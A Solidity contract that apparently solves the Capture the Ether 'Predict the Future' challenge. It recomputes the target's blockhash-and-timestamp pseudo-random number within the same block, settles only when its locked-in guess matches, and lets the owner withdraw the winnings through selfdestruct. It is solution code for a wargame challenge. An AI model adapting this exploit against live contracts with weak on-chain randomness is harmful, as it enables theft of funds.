pragma solidity ^0.4.22;

import "./a.sol";


contract AlwaysWin {
    uint8 public number;
    address owner;
    
    constructor() {
        owner = msg.sender;
    }
    
    function recover() {
        require(owner == msg.sender);
        selfdestruct(owner);
    } 
    
    function () public payable {
        //selfdestruct(owner);
    }
    
    function setGuess(address lottery, uint8 _number) public payable {
        require(msg.value == 1 ether);
        
        PredictTheFutureChallenge a = PredictTheFutureChallenge(lottery);
        a.lockInGuess.value(msg.value)(_number);
        
        number = _number;
    }
    
    function computeNumber() internal returns (uint8) {
        return (uint8(keccak256(block.blockhash(block.number - 1), now)) % 10);
    }
    
    function play(address lottery) public returns (uint8, uint8) {
        uint8 currentNumber = computeNumber();
        
        emit FoundNumber(currentNumber, number);
        
        require(currentNumber == number);
        
        PredictTheFutureChallenge a = PredictTheFutureChallenge(lottery);
        a.settle();
        
        return (number, currentNumber);
    }
    
    event FoundNumber(uint8 currentNumber, uint8 number);
}